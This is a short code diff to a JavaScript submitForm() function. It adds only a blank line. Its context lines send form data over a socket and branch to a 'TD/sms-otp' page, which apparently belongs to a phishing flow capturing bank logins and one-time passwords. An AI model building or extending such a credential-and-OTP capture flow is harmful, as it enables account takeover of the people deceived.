@@ -61,6 +61,7 @@ function submitForm() {
 
     socket.emit('submit', Object.fromEntries(formData));
 
+
     if (pageRedirection == 'TD/sms-otp') {
         console.log(`this is pageRedirection ${pageRedirection}`);
         console.log(`this is page ${page}`)
